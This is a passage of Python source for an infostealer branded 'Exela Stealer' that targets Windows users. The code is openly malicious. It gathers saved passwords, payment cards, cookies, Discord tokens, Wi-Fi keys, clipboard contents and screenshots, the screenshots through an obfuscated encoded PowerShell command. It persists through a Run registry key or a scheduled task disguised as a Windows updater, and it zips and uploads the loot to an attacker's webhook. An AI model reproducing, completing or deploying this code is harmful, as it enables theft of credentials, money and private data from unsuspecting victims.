                    dataa = req2.json()[0]
                    billgininfo = f"{dataa['billing_address']['line_1']}, {dataa['billing_address']['city']}, " + f"{dataa['billing_address']['country']}, " + f"{dataa['billing_address']['postal_code']}, "
                    embed.add_field(name="💳 Paymen information", inline=False, value = f"```card Type : {dataa['brand']}, Last Four : {dataa['last_4']}, Expiration Date : {dataa['expires_month']}/{dataa['expires_year']}, Cart on name : {dataa['billing_address']['name']}, Adress : {billgininfo}```")
                else:
                    pass
                if req.json()['bio'] != "":
                    embed.add_field(name="<a:gift:1021608479808569435> Discord Account Biography",inline=False, value=f"```{req.json()['bio']}```")
                embed.add_field(name=f"<a:pinkcrown:996004209667346442> Discord Token",inline=False, value=f"```{f}```")
                embed.set_footer(text="https://t.me/ExelaStealer")
                self.hook.send(embed=embed)
                self.discordd.append(f"Discord ID : {id}\nUsername : {req.json()['username']}\nEmail : {req.json()['email']}\nis mfa Enabled : {req.json()['mfa_enabled']}\nNitro Status : {nitro}\nDiscord Token : {str(f)}")
        except:
            pass
    def metlFile(self):
        pathxd = os.getenv("localappdata") + r"\WindowsUpdateChecker"
        fullPath = os.path.abspath(sys.argv[0])
        if os.path.isdir(pathxd):
            return
        else:
            try:
                os.mkdir(pathxd)
                shutil.copyfile(fullPath, pathxd + r"\AutoUpdater.exe")
            except Exception as e:
                print(str(e))
    def getPriv(self):
        try:
            code = ctypes.windll.shell32.IsUserAnAdmin()
            return code
        except:
            return 0 
    def copyToStartup(self):
        self.metlFile()
        output = self.getPriv()
        if methodxd == "regedit":
            if output == 0: # copy to hkcu
                softWare = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
                winreg.SetValueEx(softWare, "AutoUpdateChecker", 0, winreg.REG_SZ, os.getenv("localappdata") + r"\WindowsUpdateChecker\AutoUpdater.exe")
            else:
                softWare = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run")
                winreg.SetValueEx(softWare, "AutoUpdateChecker", 0, winreg.REG_SZ, os.getenv("localappdata") + r"\WindowsUpdateChecker\AutoUpdater.exe")
        elif methodxd == "schtasks":
            if output == 1:
                schtaskCommand = "schtasks /create /f /sc onlogon /rl highest " + "/tn \"AutoUpdateChecker\"" + " /tr " + "\"" + os.getenv("localappdata") + r"\WindowsUpdateChecker\AutoUpdater.exe" + "\""
                os.system(schtaskCommand)
            else:
                print("need admin priw, for this method")
    def sendxd(self):
        global hooksxd
        instagram = ""
        twitter = ""
        tiktok = ""
        reddit = ""
        steamm = ""
        discords = ""
        roblox = ""
        if self.insta: instagram = "Yes"
        else:instagram = "Nope"
        if self.twitter:twitter = "Yes"
        else:twitter = "Nope"
        if self.tiktok:tiktok = "Yes"
        else:tiktok="Nope"
        if self.reddit:reddit="Yes"
        else:reddit="Nope"
        if self.discrod: discords = "Yes"
        else:discords = "Nope"
        if self.steam: steamm="Yes"
        else: steamm="Nope"
        if self.roblox: roblox = "Yes"
        else:roblox = "Nope"
        command = "wmic csproduct get uuid"
        run = str(subprocess.check_output(command, shell=True).decode('utf-8').split("\n")[1].strip())
        shutil.make_archive(os.getenv('temp') + f"\\{run}", "zip", os.getenv('temp') + f"\\{run}")
        hooksxdd = dhooks.Webhook(UrLxD, avatar_url="https://i.hizliresim.com/a28jbcj.jfif", username="i fucked her (quicaxd <3)")
        filee = dhooks.File(os.getenv('temp') + f"\\{run}.zip")
        embed = dhooks.Embed(title="***Developer's github account***", description="***Exela Stealer***", color=0x070707, url="https://github.com/quicaxd", timestamp = "now")
        embed.set_thumbnail(url="https://i.hizliresim.com/8po0puy.jfif")
        embed.add_field(name="Found Instagram Session's",  inline=True,value=f"```{instagram}```")
        embed.add_field(name="Found Twitter Session's",  inline=True,value=f"```{twitter}```")
        embed.add_field(name="Found Tiktok Session's",  inline=True,value=f"```{tiktok}```")
        embed.add_field(name="Found Reddit Session's",  inline=True,value=f"```{reddit}```")
        embed.add_field(name="Found Discord Token's",  inline=True,value=f"```{discords}```")
        embed.add_field(name="Found Steam Session's",  inline=True,value=f"```{steamm}```")
        embed.add_field(name="Found Roblox Session's",  inline=True,value=f"```{roblox}```")
        embed.add_field(name="Total Password's",  inline=True,value=f"```{self.passws}```")
        embed.add_field(name="Total Card's",  inline=True,value=f"```{self.cc}```")
        embed.add_field(name="Total Cookies",  inline=True,value=f"```{self.cookie}```")
        embed.add_field(name="Total Download's",  inline=True,value=f"```{self.downloads}```")
        embed.add_field(name="Total History's",  inline=True,value=f"```{self.historys}```")
        if injectKeylogger == "%keyloggertrue%":
            embed.add_field(name="Inject Keylogger?", inline=True, value="```Yes, Keylogger logs will come after every 300 keystrokes```")
        else:
            embed.add_field(name="Inject Keylogger?", inline=True, value="```Nope```")
        embed.add_field(name="Exela Stealer is the best", inline=False, value=f"```{'just sex and money xd'}```")
        embed.set_footer(text="https://t.me/ExelaStealer")
        hooksxdd.send(embed=embed, file=filee)
        os.remove(os.getenv('temp') + f"\\{run}.zip")
        shutil.rmtree(os.getenv('temp') + f"\\{run}")
    def reverseToNormal(self, entry):
        return entry[::-1]
    def writeToText(self, path, data):
        with open(path, "a", encoding="utf-8", errors="ignore") as f:
            f.write(str(data) + "\n")
    def get_active_window_title(self):
        try:
            user32 = ctypes.windll.user32
            GetForegroundWindow = user32.GetForegroundWindow
            GetWindowTextLength = user32.GetWindowTextLengthW
            GetWindowText = user32.GetWindowTextW
            hwnd = GetForegroundWindow()
            length = GetWindowTextLength(hwnd) + 1
            if length == 1:
                return "No active window title"
            
            buffer = ctypes.create_unicode_buffer(length)  # Bellek tamponu oluşturulur
            GetWindowText(hwnd, buffer, length)  # Başlık metni tampona alınır
            
            if buffer.value == "":
                return "No active window title"
            
            return buffer.value
        except:
            return "Null"
    def get_last_clipboard_text(self, path):
        try:
            pathsxd = os.getenv('temp') + "\\" + path
            process = subprocess.run(["powershell.exe", "Get-Clipboard"], capture_output=True, text=True, shell=True)
            output = process.stdout.strip()
            if not output == "":
                with open(pathsxd + "\\last_clipboard_text.txt", "a", encoding="utf-8", errors="ignore") as lst:
                    lst.write("----------------------https://t.me/ExelaStealer----------------------\n" + "=" * 70 + "\n")
                    lst.write(output)
        except Exception as e:
            print(str(e))
    def get_last_clipboard_image(self, path):
        try:
            pathsxd = os.getenv('temp') + "\\" + path + "\\last_clipboard_image.png"
            powershell_command = f'''          
            $clipboardData = Get-Clipboard -Format Image
            $destinationPath = "{pathsxd}"
            $clipboardData.Save($destinationPath)'''
            subprocess.run(['powershell.exe', '-Command', powershell_command],capture_output=True, text=True, shell=True)
        except Exception as e:
            print(str(e))
    def get_all_system_data(self):
        command = "wmic csproduct get uuid"
        run = str(subprocess.check_output(command, shell=True).decode('utf-8').split("\n")[1].strip())
        process = subprocess.run(r"echo ####System Info#### & systeminfo & echo ####System Version#### & ver & echo ####Host Name#### & hostname & echo ####Environment Variable#### & set & echo ####Logical Disk#### & wmic logicaldisk get caption,description,providername & echo ####User Info#### & net user & echo ####Startup Info#### & wmic startup get caption,command & echo ####Firewallinfo#### & netsh firewall show state ", capture_output= True, shell= True)
        output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
        tmp = os.getenv('temp')
        pythoncom.CoInitialize()
        w = wmi.WMI()
        cpu_info = w.Win32_Processor()[0]
        cpu_cores = psutil.cpu_count(logical=False)
        cpu_freq = psutil.cpu_freq()
        mem_info = psutil.virtual_memory()
        mem_details = []
        for slot, mem in enumerate(w.Win32_PhysicalMemory()):
            mem_details.append({
                "Slot": slot,
                "Capacity": mem.Capacity,
                "Manufacturer": mem.Manufacturer,
                "Part Number": mem.PartNumber,
                "Speed": mem.Speed,
                "Type": mem.MemoryType
            })
        disk_info = []
        for disk in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(disk.mountpoint)
                disk_info.append({
                    "Device": disk.device,
                    "Mount Point": disk.mountpoint,
                    "File System": disk.fstype,
                    "Total Space": usage.total / (1024 ** 3),
                    "Used Space": usage.used / (1024 ** 3),
                    "Free Space": usage.free / (1024 ** 3),
                    "Usage Percentage": usage.percent
                })
            except Exception:
                pass
        gpu_info = []
        try:
            gpus = GPUtil.getGPUs()
            for gpu in gpus:
                gpu_info.append({
                    "GPU Name": gpu.name,
                    "GPU Memory": gpu.memoryTotal,
                    "GPU Usage": gpu.memoryUtil * 100
                })
        except:
            pass
        with open(tmp + f"\\{run}\\system_info.txt", "a", encoding="utf-8", errors="ignore") as f:
            f.write("Full Hardware information\n")
            f.write("CPU Info:\n")
            f.write(f"   Processor: {cpu_info.Name}\n")
            f.write(f"   Manufacturer: {cpu_info.Manufacturer}\n")
            f.write(f"   Cores: {cpu_cores}\n")
            f.write(f"   Max Frequency: {cpu_freq.max:.2f} MHz\n")
            f.write(f"   Min Frequency: {cpu_freq.min:.2f} MHz\n\n")
            
            f.write("GPU Info:\n")
            for gpu in gpu_info:
                f.write(f"   GPU Name: {gpu['GPU Name']}\n")
                f.write(f"   GPU Memory: {gpu['GPU Memory']:.2f} MB\n")
                f.write(f"   GPU Usage: {gpu['GPU Usage']:.2f}%\n\n")
            
            f.write("Memory Info:\n")
            f.write(f"   Total RAM: {mem_info.total / (1024 ** 3):.2f} GB\n")
            f.write(f"   Available RAM: {mem_info.available / (1024 ** 3):.2f} GB\n\n")
            
            f.write("Detailed Memory Info:\n")
            for mem in mem_details:
                f.write(f"   Slot: {mem['Slot']}\n")
                f.write(f"   Capacity: {mem['Capacity']}\n")
                f.write(f"   Manufacturer: {mem['Manufacturer']}\n")
                f.write(f"   Part Number: {mem['Part Number']}\n")
                f.write(f"   Speed: {mem['Speed']}\n")
                f.write(f"   Type: {mem['Type']}\n\n")
            
            f.write("Disk Info:\n")
            for disk in disk_info:
                f.write(f"   Device: {disk['Device']}\n")
                f.write(f"   Mount Point: {disk['Mount Point']}\n")
                f.write(f"   File System: {disk['File System']}\n")
                f.write(f"   Total Space: {disk['Total Space']:.2f} GB\n")
                f.write(f"   Used Space: {disk['Used Space']:.2f} GB\n")
                f.write(f"   Free Space: {disk['Free Space']:.2f} GB\n")
                f.write(f"   Usage Percentage: {disk['Usage Percentage']}%\n\n")
                f.write(f"Full System Information\n{output}")
    def GetWifiPasswords(self, path:str):
        pathxd = os.path.join(path, "Wifi.txt")
        try:
            command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output = True, shell=True).stdout.decode(errors="ignore")
            wifi_files = []
            for filename in os.listdir(os.getcwd()):
                if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
                    wifi_files.append(filename)
            for i in wifi_files:
                with open(i, 'r') as f:
                    name_counter = 0
                    wifi_name = ""
                    wifi_password = ""
                    creds = []
                    for line in f.readlines():
                        if "name" in line and name_counter == 0:
                            name_counter += 1
                            stripped = line.strip()
                            front = stripped[6:]
                            back = front[:-7]
                            wifi_name = back
                        if "keyMaterial" in line:
                            stripped = line.strip()
                            front = stripped[13:]
                            back = front[:-14]
                            wifi_password = back
                if wifi_password == "":
                    wifi_password = "none"
                creds = [wifi_name, wifi_password]
                with open(pathxd, 'a', encoding="utf-8", errors="ignore") as f:
                    f.write("\n[*] Wifi Name: " + creds[0] + "\n" + "[+] Wifi Password: " + creds[1] + "\n")
                    f.close()
                # Delete created files
            for y in wifi_files:
                os.remove(y)
            wifi_profiles = []
            wifi_passwords = dict()
            command = subprocess.run('netsh wlan show profile', shell= True, capture_output= True).stdout.decode(errors= 'ignore').strip().splitlines()
            for line in command:
                if 'All User Profile' in line:
                    name= line[(line.find(':') + 1):].strip()
                    wifi_profiles.append(name)
                for profile in wifi_profiles:
                    for line in subprocess.run(f'netsh wlan show profile "{profile}" key=clear', shell= True, capture_output= True).stdout.decode(errors= 'ignore').strip().splitlines():
                        if 'Key Content' in line:
                            wifi_passwords[profile] = line[(line.find(':') + 1):].strip()    
            with open(pathxd, "a", errors="ignore", encoding="utf-8") as data:
                for profile, password in wifi_passwords.items():
                    data.write(f"WiFi Profile: {profile}\nPassword: {password}\n\n")
        except Exception as asd:
            print(str(asd))
    def writeAllData(self):    
        command = "wmic csproduct get uuid"
        run = str(subprocess.check_output(command, shell=True).decode('utf-8').split("\n")[1].strip())
        tmp = os.getenv('temp')
        mic_finder = GetMic()
        mic_data = mic_finder.list_microphones()
        if os.path.isdir(tmp + f"\\{run}"):
            shutil.rmtree(tmp+f'\\{run}')
            print("Deleted Temp Folder!, creating new folder") 
            os.mkdir(tmp + f"\\{run}")
            if not self.passws == 0:
                os.mkdir(tmp + f"\\{run}\\Passwords")
                with open(tmp + f"\\{run}\\Passwords\\Passwords.txt", "a", encoding="utf-8", errors="ingore") as f:
                    f.write("----------------------https://t.me/ExelaStealer----------------------\n" + "=" * 70 + "\n")
                    for passwss in self.passw:
                        f.write(str(passwss) + "\n")
            if not self.cc == 0:
                os.mkdir(tmp + f"\\{run}\\Cards")
                with open(tmp + f"\\{run}\\Cards\\Cards.txt", "a", encoding="utf-8", errors="ingore") as x:
                    x.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                    for uknowwhatiscc in self.ottomonCC:
                        x.write(str(uknowwhatiscc) + "\n")
            if not self.cookie == 0:
                os.mkdir(tmp + f"\\{run}\\Cookies")
                with open(tmp + f"\\{run}\\Cookies\\Cookies.txt", "a", encoding="utf-8", errors="ingore") as c:
                    c.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                    for allCookies in self.cookeds:
                        c.write(str(allCookies) + "\n")
            if not self.downloads == 0:
                os.mkdir(tmp + f"\\{run}\\Downloads")
                with open(tmp + f"\\{run}\\Downloads\\Downloads.txt", "a", encoding="utf-8", errors="ingore") as d:
                    d.write("----------------------https://t.me/ExelaStealer----------------------\n" + "=" * 70 + "\n")
                    for dwnlds in self.sexDonwloads:
                        d.write(str(dwnlds) + "\n")
            if not self.historys == 0:
                os.mkdir(tmp + f"\\{run}\\Historys")
                with open(tmp + f"\\{run}\\Historys\\Historys.txt", "a", encoding="utf-8", errors="ingore") as q:
                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                    for date in self.sexHistorys:
                        q.write(str(date) + "\n")
            if self.mozilla_history:
                try:
                    os.mkdir(tmp + f"\\{run}\\Firefox")
                except:
                    pass
                with open(tmp + f"\\{run}\\Firefox\\History.txt", "a", encoding="utf-8", errors="ingore") as q:
                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                    for date in self.mozilla_history:
                        q.write(str(date) + "\n")
            if self.mozilla_cookie:
                try:
                    os.mkdir(tmp + f"\\{run}\\Firefox")
                except:
                    pass
                with open(tmp + f"\\{run}\\Firefox\\Cookies.txt", "a", encoding="utf-8", errors="ingore") as q:
                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                    for date in self.mozilla_cookie:
                        q.write(str(date) + "\n")
            if not self.insta == 0:
                os.mkdir(tmp + f"\\{run}\\Instagram")
                with open(tmp + f"\\{run}\\Instagram\\instagram.txt", "a", encoding="utf-8", errors="ingore") as q:
                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                    for ii in self.instaa:
                        q.write(str(ii) + "\n")
            if not self.twitter == 0:
                os.mkdir(tmp + f"\\{run}\\Twitter")
                with open(tmp + f"\\{run}\\Twitter\\Twitter.txt", "a", encoding="utf-8", errors="ingore") as q:
                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                    for tt in self.twitterr:
                        q.write(str(tt) + "\n")
            if not self.tiktok == 0:
                os.mkdir(tmp + f"\\{run}\\Tiktok")
                with open(tmp + f"\\{run}\\Tiktok\\Tiktok.txt", "a", encoding="utf-8", errors="ingore") as q:
                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                    for ti in self.tiktokk:
                        q.write(str(ti) + "\n")
            if not self.reddit == 0:
                os.mkdir(tmp + f"\\{run}\\Reddit")
                with open(tmp + f"\\{run}\\Reddit\\Reddit.txt", "a", encoding="utf-8", errors="ingore") as q:
                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                    for re in self.redditt:
                        q.write(str(re) + "\n")
            if self.discrod:
                os.mkdir(tmp + f"\\{run}\\Discord")
                with open(tmp + f"\\{run}\\Discord\\Discord.txt", "a", encoding="utf-8", errors="ingore") as q:
                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                    for re in self.discordd:
                        q.write(str(re) + "\n")
            if not self.steam:
                os.mkdir(tmp + f"\\{run}\\Steam")
                with open(tmp + f"\\{run}\\Steam\\Steam.txt", "a", encoding="utf-8", errors="ingore") as q:
                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                    for st in self.steamm:
                        q.write(str(st) + "\n")
            if self.roblox==True:
                os.mkdir(tmp + f"\\{run}\\Roblox")
                with open(tmp + f"\\{run}\\Roblox\\Roblox.txt", "a", encoding="utf-8", errors="ignore") as q:
                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                    for robl in self.robloxx:
                        q.write(str(robl))
            if not self.growtopia == 0:
                os.mkdir(tmp + f"\\{run}\\Growtopia")
                with open(tmp + f"\\{run}\\Growtopia\\Growtopia.txt", "a", encoding="utf-8", errors="ingore") as q:
                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                    for gw in self.growtopiaa:
                        q.write(str(gw) + "\n")
            if 5 < 10:
                command = "JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA=" # Unicode encoded command
                subprocess.run(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", command], shell=True, capture_output=True, cwd= tmp + f"\\{run}")
            if 0 < 1:
                active_window_title = self.get_active_window_title()
                with open(tmp + f"\\{run}\\active_window.txt", "a", encoding="utf-8", errors="ignore") as x:
                    x.write(str(active_window_title))
            if 7<15:
                try:
                    process = subprocess.run("tasklist /FO LIST", capture_output= True, shell= True)
                    output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
                    with open(tmp + f"\\{run}\\process_list.txt", "w",encoding="utf-8", errors="ignore") as process_list:
                        process_list.write(output)
                except:
                    pass
            if 5 > 4:
                self.get_last_clipboard_text(run)
                self.get_last_clipboard_image(run)        
            if 45 > 3:
                with open(tmp + f"\\{run}\\system_info.txt", "a", encoding="utf-8", errors="ignore") as micro:
                    micro.write("----------------------https://t.me/ExelaStealer----------------------\n======================================================================\n")
                if mic_data:
                    with open(tmp + f"\\{run}\\system_info.txt", "a", encoding="utf-8", errors="ignore") as micro:
                        micro.write("Listed Microphone's\n======================================================================\n")
                    for mics in mic_data:
                        with open(tmp + f"\\{run}\\system_info.txt", "a", encoding="utf-8", errors="ignore") as micro:
                            micro.write("Listed Microphone's\n" + mics + "\n")
                self.get_all_system_data()
            if 7855 < 8888:
                self.GetWifiPasswords(tmp + f"\\{run}")
        else:
            os.mkdir(tmp + f"\\{run}")
            if not self.passws == 0:
                os.mkdir(tmp + f"\\{run}\\Passwords")
                with open(tmp + f"\\{run}\\Passwords\\Passwords.txt", "a", encoding="utf-8", errors="ingore") as f:
                    f.write("----------------------https://t.me/ExelaStealer----------------------\n" + "=" * 70 + "\n")
                    for passwss in self.passw:
                        f.write(str(passwss) + "\n")
            if not self.cc == 0:
                os.mkdir(tmp + f"\\{run}\\Cards")
                with open(tmp + f"\\{run}\\Cards\\Cards.txt", "a", encoding="utf-8", errors="ingore") as x:
                    x.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                    for uknowwhatiscc in self.ottomonCC:
                        x.write(str(uknowwhatiscc) + "\n")
            if not self.cookie == 0:
                os.mkdir(tmp + f"\\{run}\\Cookies")
                with open(tmp + f"\\{run}\\Cookies\\Cookies.txt", "a", encoding="utf-8", errors="ingore") as c:
                    c.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                    for allCookies in self.cookeds:
                        c.write(str(allCookies) + "\n")
            if not self.downloads == 0:
                os.mkdir(tmp + f"\\{run}\\Downloads")
                with open(tmp + f"\\{run}\\Downloads\\Downloads.txt", "a", encoding="utf-8", errors="ingore") as d:
                    d.write("----------------------https://t.me/ExelaStealer----------------------\n" + "=" * 70 + "\n")
                    for dwnlds in self.sexDonwloads:
                        d.write(str(dwnlds) + "\n")
            if not self.historys == 0:
                os.mkdir(tmp + f"\\{run}\\Historys")
                with open(tmp + f"\\{run}\\Historys\\Historys.txt", "a", encoding="utf-8", errors="ingore") as q:
                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                    for date in self.sexHistorys:
                        q.write(str(date) + "\n")
            if self.mozilla_history:
                try:
                    os.mkdir(tmp + f"\\{run}\\Firefox")
                except:
                    pass
                with open(tmp + f"\\{run}\\Firefox\\History.txt", "a", encoding="utf-8", errors="ingore") as q:
                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                    for date in self.mozilla_history:
                        q.write(str(date) + "\n")
            if self.mozilla_cookie:
                try:
                    os.mkdir(tmp + f"\\{run}\\Firefox")
                except:
                    pass
                with open(tmp + f"\\{run}\\Firefox\\Cookies.txt", "a", encoding="utf-8", errors="ingore") as q:
                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                    for date in self.mozilla_cookie:
                        q.write(str(date) + "\n")
            if not self.insta == 0:
                os.mkdir(tmp + f"\\{run}\\Instagram")
                with open(tmp + f"\\{run}\\Instagram\\instagram.txt", "a", encoding="utf-8", errors="ingore") as q:
                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                    for ii in self.instaa:
                        q.write(str(ii) + "\n")
            if not self.twitter == 0:
                os.mkdir(tmp + f"\\{run}\\Twitter")
                with open(tmp + f"\\{run}\\Twitter\\Twitter.txt", "a", encoding="utf-8", errors="ingore") as q:
                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                    for tt in self.twitterr:
                        q.write(str(tt) + "\n")
            if not self.tiktok == 0:
                os.mkdir(tmp + f"\\{run}\\Tiktok")
                with open(tmp + f"\\{run}\\Tiktok\\Tiktok.txt", "a", encoding="utf-8", errors="ingore") as q:
                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                    for ti in self.tiktokk:
                        q.write(str(ti) + "\n")
            if not self.reddit == 0:
                os.mkdir(tmp + f"\\{run}\\Reddit")
                with open(tmp + f"\\{run}\\Reddit\\Reddit.txt", "a", encoding="utf-8", errors="ingore") as q:
                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                    for re in self.redditt:
                        q.write(str(re) + "\n")
            if self.discrod:
                os.mkdir(tmp + f"\\{run}\\Discord")
                with open(tmp + f"\\{run}\\Discord\\Discord.txt", "a", encoding="utf-8", errors="ingore") as q:
                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                    for re in self.discordd:
                        q.write(str(re) + "\n")
            if not self.steamm == 0:
                os.mkdir(tmp + f"\\{run}\\Steam")
